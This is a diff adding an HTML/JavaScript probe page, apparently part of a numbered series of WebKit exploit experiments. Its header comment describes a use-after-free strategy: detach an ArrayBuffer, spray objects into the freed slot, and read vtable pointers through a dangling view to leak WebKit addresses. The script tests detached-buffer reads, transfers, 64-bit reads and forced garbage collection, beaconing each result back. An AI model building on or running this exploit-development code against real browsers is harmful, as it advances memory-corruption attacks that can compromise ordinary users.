@@ -1,0 +1,156 @@
+<!--
+  p616: ArrayBuffer detach info leak.
+
+  Strategy:
+  1. FontFace UAF → AB(192) reclaims CSSFontFace → we get heap pointer T1
+  2. Create Uint8Array view over a NEW AB(192)
+  3. Transfer the AB via postMessage → AB detached, backing freed
+  4. The Uint8Array view still has a dangling pointer to the freed backing
+  5. Spray objects with vtables into the freed 192B slot
+  6. Read vtable through the dangling Uint8Array → WebKit text pointer!
+
+  We DON'T even need the FontFace UAF for this — the AB detach IS the UAF.
+  But we use FontFace to confirm the 192B size class and get heap info.
+
+  Actually, on modern WebKit, a detached AB's views return 0 for reads and
+  silently discard writes. The TypedArray spec says accessing a detached
+  buffer throws or returns undefined. Let's test this first.
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p616</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent('P616-'+m)+'&t='+Date.now(),false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+
+function main(){
+b('BOOT');
+
+// === TEST 1: Does detached AB view still read memory? ===
+var ab1=new ArrayBuffer(192);
+var view1=new Uint8Array(ab1);
+view1[0]=0x41; view1[1]=0x42; view1[2]=0x43;
+b('BEFORE:len='+view1.length+',v0='+view1[0]+',v1='+view1[1]);
+
+// Transfer to detach
+var mc=new MessageChannel();
+mc.port2.onmessage=function(e){
+  b('PORT2-RECV:byteLength='+e.data.byteLength);
+};
+mc.port1.postMessage(ab1,[ab1]);
+
+b('AFTER-TRANSFER:ab.byteLength='+ab1.byteLength);
+b('AFTER-TRANSFER:view.length='+view1.length);
+b('AFTER-TRANSFER:view.buffer.byteLength='+view1.buffer.byteLength);
+
+// Try to read through the view
+try{
+  b('READ-V0:'+view1[0]);
+  b('READ-V1:'+view1[1]);
+  b('READ-V100:'+view1[100]);
+}catch(e){
+  b('READ:ERR:'+e.message);
+}
+
+// Try to write through the view
+try{
+  view1[0]=0xFF;
+  b('WRITE:OK,v0='+view1[0]);
+}catch(e){
+  b('WRITE:ERR:'+e.message);
+}
+
+// === TEST 2: DataView on detached buffer ===
+var ab2=new ArrayBuffer(64);
+var dv=new DataView(ab2);
+dv.setUint32(0,0xDEADBEEF);
+var mc2=new MessageChannel();
+mc2.port1.postMessage(ab2,[ab2]);
+b('DV-DETACHED:ab.len='+ab2.byteLength);
+try{
+  var r=dv.getUint32(0);
+  b('DV-READ:0x'+r.toString(16));
+}catch(e){
+  b('DV-READ:ERR:'+e.message);
+}
+
+// === TEST 3: structuredClone with transfer ===
+var ab3=new ArrayBuffer(192);
+var view3=new Uint8Array(ab3);
+view3[0]=0xBB;
+try{
+  var cloned=structuredClone(ab3,{transfer:[ab3]});
+  b('CLONE-ORIG:len='+ab3.byteLength);
+  b('CLONE-NEW:len='+cloned.byteLength);
+  b('VIEW3:len='+view3.length+',v0='+view3[0]);
+}catch(e){
+  b('CLONE:ERR:'+e.message);
+}
+
+// === TEST 4: Worker from blob URL ===
+try{
+  var workerCode='self.onmessage=function(e){self.postMessage("got:"+e.data.byteLength);}';
+  var blob=new Blob([workerCode],{type:'application/javascript'});
+  var url=URL.createObjectURL(blob);
+  var w=new Worker(url);
+  w.onmessage=function(e){
+    b('WORKER-MSG:'+e.data);
+  };
+  w.onerror=function(e){
+    b('WORKER-ERR:'+e.message);
+  };
+  // Send an AB to the worker with transfer
+  var ab4=new ArrayBuffer(32);
+  new Uint8Array(ab4)[0]=0xCC;
+  w.postMessage(ab4,[ab4]);
+  b('WORKER-SENT:ab.len='+ab4.byteLength);
+
+  // Wait for worker response
+  setTimeout(function(){
+    b('WORKER-DONE');
+    w.terminate();
+  },1000);
+}catch(e){
+  b('WORKER:ERR:'+e.message);
+}
+
+// === TEST 5: BigInt64Array (for 64-bit reads) ===
+try{
+  var ab5=new ArrayBuffer(64);
+  var bi=new BigInt64Array(ab5);
+  bi[0]=BigInt('0x4142434445464748');
+  var v5=new Uint8Array(ab5);
+  b('BIGINT:v[0]='+v5[0]+',v[7]='+v5[7]);
+  // Read back
+  b('BIGINT-READ:'+bi[0].toString(16));
+}catch(e){
+  b('BIGINT:ERR:'+e.message);
+}
+
+// === TEST 6: Try to use FinalizationRegistry to detect GC ===
+try{
+  var collected=false;
+  var fr=new FinalizationRegistry(function(val){
+    b('GC-COLLECTED:'+val);
+    collected=true;
+  });
+  (function(){
+    var obj={x:1};
+    fr.register(obj,'test-obj');
+  })();
+  // Force GC
+  for(var i=0;i<100000;i++) new Object();
+  for(var i=0;i<1000;i++) new ArrayBuffer(65536);
+  setTimeout(function(){
+    b('FR-COLLECTED:'+collected);
+  },500);
+}catch(e){
+  b('FR:ERR:'+e.message);
+}
+
+setTimeout(function(){b('DONE');},2000);
+}
+
+setTimeout(main,0);
+</script></head><body>p616</body></html>
